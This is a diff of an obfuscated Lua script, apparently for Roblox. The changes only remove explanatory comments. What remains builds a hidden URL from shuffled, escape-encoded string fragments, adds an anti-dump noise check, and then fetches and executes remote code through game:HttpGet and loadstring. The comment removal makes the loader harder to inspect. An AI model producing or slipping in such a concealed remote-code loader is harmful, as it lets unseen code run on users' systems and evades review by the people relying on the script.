@@ -9,28 +9,26 @@ return (function(...)
         "\099\090\081\043","\074\065\089\083\073\046\076\117\110","\070\071\081\065"
     }
 
-    -- ========= RANDOM SHUFFLE =========
     for i = 1, #R * 3 do
         local a = (i * 17) % #R + 1
         local b = (i * 29) % #R + 1
         R[a], R[b] = R[b], R[a]
     end
 
-    -- ========= DECODE =========
+    
     local function D(s)
         return (s:gsub("\\(%d%d?%d?)", function(n)
             return string.char((tonumber(n) + 256) % 256)
         end))
     end
 
-    -- ========= STATE MACHINE BUILD =========
     local order = {2,4,6,8,10,7,5,3}
     local URL = ""
     for _,i in ipairs(order) do
         URL = URL .. D(R[i])
     end
 
-    -- ========= ANTI-DUMP NOISE =========
+    
     local function noise()
         local x = 0
         for i = 1, 20 do
@@ -40,7 +38,7 @@ return (function(...)
     end
     if noise() == -1 then return end
 
-    -- ========= EXEC =========
+
     local src = game:HttpGet(URL)
     return loadstring(src)(...)
 
